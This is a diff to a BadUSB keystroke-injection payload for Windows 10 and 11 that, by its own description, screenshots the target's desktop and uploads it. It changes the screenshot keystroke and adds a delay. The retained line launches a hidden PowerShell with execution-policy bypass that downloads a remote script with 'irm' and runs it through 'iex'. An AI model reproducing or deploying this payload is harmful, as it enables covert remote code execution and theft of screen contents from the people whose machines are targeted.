@@ -6,9 +6,10 @@ REM	Description: This payload will take a screenshot of the targets desktop, upl
 
 REM	Target: Windows 10, 11
 
+PRINTSCREEN
+DELAY 300
 GUI r
 DELAY 500
-PRTSC
 STRING powershell -w h -ep bypass $dc='';$icid='';irm https://files.seall.dev/badusb/ScreenshotGrabber.ps1 | iex
 ENTER
 
